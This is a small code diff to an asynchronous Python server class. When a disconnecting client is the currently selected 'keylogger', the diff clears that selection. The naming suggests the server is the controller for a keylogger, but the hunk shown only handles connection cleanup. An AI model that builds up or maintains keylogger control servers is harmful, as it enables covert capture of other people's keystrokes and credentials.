@@ -30,6 +30,8 @@ class Server(metaclass=MetaSingleton):
 
     async def disconnect_client(self, addr: tuple):
         if addr in self.clients:
+            if addr == self.__selected_keylogger:
+                self.__selected_keylogger = None
             _, writer = self.clients.pop(addr)
             writer.close()
             await writer.wait_closed()
